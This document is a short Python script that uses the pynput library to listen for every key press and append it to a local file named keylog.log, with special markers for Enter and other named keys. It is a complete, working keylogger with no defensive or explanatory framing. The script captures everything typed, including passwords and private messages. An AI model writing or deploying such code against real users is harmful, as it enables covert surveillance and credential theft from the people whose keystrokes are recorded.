from pynput.keyboard import Key, Listener

# Log file to store the key logs
log_file = "keylog.log"

def on_press(key):
    """
    Callback function to handle key press events.
    """
    try:
        # Try to get the character of the key pressed
        pressed_key = str(key.char)
    except AttributeError:
        # Handle Enter key press separately
        if key == Key.enter: pressed_key = '[ENTER]\n'
        else: pressed_key = f'[{key.name.upper()}]'

    # Open the log file in append mode and write the pressed key
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(pressed_key)

# Set up the listener to monitor key press events
with Listener(on_press=on_press) as listener:
    listener.join()
